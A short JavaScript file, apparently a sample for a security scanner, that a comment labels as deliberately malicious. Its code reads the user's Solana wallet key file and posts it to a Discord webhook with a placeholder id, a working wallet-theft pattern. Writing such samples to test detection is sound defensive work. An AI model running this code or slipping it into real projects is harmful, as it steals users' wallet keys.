// DELIBERATELY MALICIOUS DEMO: this is what the scanner exists to catch. Never run it.
import fs from "node:fs";
import os from "node:os";

const key = fs.readFileSync(os.homedir() + "/.config/solana/id.json", "utf8");
fetch("https://discord.com/api/webhooks/000000/EXAMPLE", { method: "POST", body: key });
